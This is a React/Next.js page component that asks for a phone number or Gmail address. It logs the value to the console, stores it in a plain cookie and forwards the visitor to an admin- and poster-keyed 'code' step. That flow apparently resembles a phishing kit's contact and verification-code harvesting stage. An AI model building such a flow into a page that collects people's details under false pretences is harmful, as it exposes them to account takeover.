import { useState } from "react";
import Cookies from "js-cookie";
import { useRouter } from "next/router";
import { FaQuestion } from "react-icons/fa";

function ContactPage() {
  const [isEmail, setisEmail] = useState(false);
  const [contact, setContact] = useState("");
  const router = useRouter();
  const { adminId, posterId } = router.query;

  const handleChange = (e) => {
    setContact(e.target.value);
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    console.log(contact);
    isEmail && Cookies.set("contact", contact);
    !isEmail && Cookies.set("contact", `+1${contact}`);
    router.push(`/${adminId}/${posterId}/code`);
  };

  return (
    <div className="mx-3 lg:mx-[70px]">
      <form onSubmit={handleSubmit}>
        <div className="min-h-[calc(100vh-20px)] flex flex-col justify-between">
          <div className="lg:container px-3 lg:px-0">
            <div className="flex justify-end mt-[36px] text-slate-600 mb-[38px] ">
              <FaQuestion size={18} />
            </div>
            <p className="text-[25px]">Enter Your Phone or Email</p>

            {!isEmail ? (
              <div className="mt-[35px] relative">
                <input
                  type="text"
                  value={contact}
                  className=" text-[16px] px-12 py-2 focus:rounded outline-none border border-transparent focus:border-cyan-600 w-full"
                  placeholder="Phone Number"
                  onChange={handleChange}
                  required
                />
                <div className="absolute inset-y-0  left-1 flex items-center">
                  <div className="flex items-center bg-white pl-1 pr-3 border-r border-slate-100">
                    +1
                  </div>
                </div>
              </div>
            ) : (
              <input
                type="text"
                value={contact}
                className="input"
                placeholder="Gmail"
                onChange={handleChange}
                required
              />
            )}
          </div>
          <div className="flex gap-10">
            <button
              type="button"
              className="w-full text-lg bg-gray-100 rounded-full py-3 text-black"
              onClick={() => {
                setisEmail(!isEmail);
                setContact("");
              }}
            >
              {!isEmail ? "Use Email" : "Use Phone"}
            </button>
            <button
              type="submit"
              className="w-full text-lg bg-custom-green rounded-full py-3 text-white"
            >
              Next
            </button>
          </div>
        </div>
      </form>
    </div>
  );
}

export default ContactPage;
